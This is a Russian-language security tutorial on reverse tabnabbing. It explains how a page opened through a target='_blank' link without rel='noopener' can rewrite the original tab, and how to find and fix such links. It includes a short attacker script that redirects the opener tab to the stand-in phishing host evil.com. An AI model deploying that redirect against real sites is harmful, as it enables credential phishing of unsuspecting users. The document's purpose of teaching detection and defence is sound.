# Tabnabbing (обратный Tabnabbing)

> Reverse Tabnabbing — это атака, при которой страница, на которую ведёт ссылка с целевой страницы, может перезаписать эту целевую страницу, например, подменив её на фишинговый сайт. Поскольку пользователь изначально находился на правильной странице, он с меньшей вероятностью заметит, что она была изменена на фишинговый сайт, особенно если он выглядит так же, как целевой. Если пользователь аутентифицируется на этой новой странице, его учётные данные (или другие конфиденциальные данные) отправляются на фишинговый сайт, а не на легитимный.

## Методология

При атаке Tabnabbing злоумышленник ищет ссылки, которые вставлены на веб-сайт и находятся под его контролем. Такие ссылки могут содержаться, например, в сообщении на форуме. Как только он находит такую функциональность, он проверяет, что атрибут `rel` ссылки не содержит значение `noopener`, а атрибут `target` содержит значение `_blank`. Если это так, сайт уязвим для Tabnabbing.

## Эксплуатация

### Пошаговая схема атаки

| Шаг | Действие |
|---|---|
| 1 | Злоумышленник размещает ссылку на свой сайт, который содержит следующий JS-код: <br> `window.opener.location = "http://evil.com"` |
| 2 | Злоумышленник заманивает жертву перейти по этой ссылке, которая открывается в новой вкладке браузера |
| 3 | Одновременно выполняется JS-код, и фоновая вкладка (целевой сайт) перенаправляется на фишинговый сайт `evil.com` |
| 4 | Если жертва снова открывает фоновую вкладку и не смотрит на адресную строку, она может подумать, что вышла из системы, так как видит, например, страницу входа |
| 5 | Жертва пытается войти снова, и злоумышленник получает её учётные данные |

### Код эксплойта

Злоумышленник размещает на своём сайте такой скрипт:

```html
<script>
    window.opener.location = "http://evil.com";
</script>
```

## Обнаружение уязвимости

Ищите следующие форматы ссылок, уязвимые для Tabnabbing:

```html
<!-- Опасно: нет rel="noopener" -->
<a href="..." target="_blank" rel=""> 

<!-- Опасно: нет rel="noopener" -->
<a href="..." target="_blank">
```

### Безопасный вариант

```html
<!-- Безопасно: добавлен rel="noopener noreferrer" -->
<a href="..." target="_blank" rel="noopener noreferrer">
```

## Что важно запомнить

| Ключевой момент | Объяснение |
|---|---|
| **Что такое Reverse Tabnabbing** | Атака, при которой страница-ссылка подменяет страницу-источник (opener) на фишинговую |
| **Условие для атаки** | Ссылка открывается в новой вкладке (`target="_blank"`) без защиты (`rel="noopener"`) |
| **Как работает** | Вредоносная страница использует `window.opener.location` для перенаправления исходной вкладки |
| **Что получает злоумышленник** | Учётные данные жертвы, если она вводит их на поддельной странице |
| **Защита** | Всегда добавлять `rel="noopener noreferrer"` к ссылкам с `target="_blank"` |

## Краткая шпаргалка

| Что делать | Почему |
|---|---|
| Всегда добавляйте `rel="noopener noreferrer"` | Предотвращает доступ новой страницы к `window.opener` |
| Используйте `rel="noopener"` хотя бы минимально | Блокирует перенаправление исходной вкладки |
| Проверяйте внешние ссылки на сайте | Убедитесь, что они безопасны для пользователей |
| Используйте инструмент для поиска уязвимых ссылок | PortSwigger/discovering-reversetabnabbing |

## Дополнительное объяснение

### Простая аналогия

Представь, что ты читаешь статью в одной вкладке браузера и кликаешь по ссылке, чтобы открыть её в новой вкладке. Пока ты читаешь новую вкладку, сайт в фоновой вкладке **тихо подменяется** на поддельный. Когда ты возвращаешься назад, ты видишь страницу входа и вводишь свой пароль, думая, что сессия истекла. На самом деле ты только что отправил пароль злоумышленнику.

### Почему это работает?

- `target="_blank"` — открывает ссылку в новой вкладке.
- Новая вкладка получает доступ к исходной через объект `window.opener`.
- Если не добавить `rel="noopener"`, новая страница может управлять исходной.

### Как защититься?

Простое правило: **всегда используй `rel="noopener noreferrer"`** для всех ссылок, у которых есть `target="_blank"`. Это стандартная практика безопасности.

```html
<a href="https://example.com" target="_blank" rel="noopener noreferrer">
  Ссылка
</a>
```
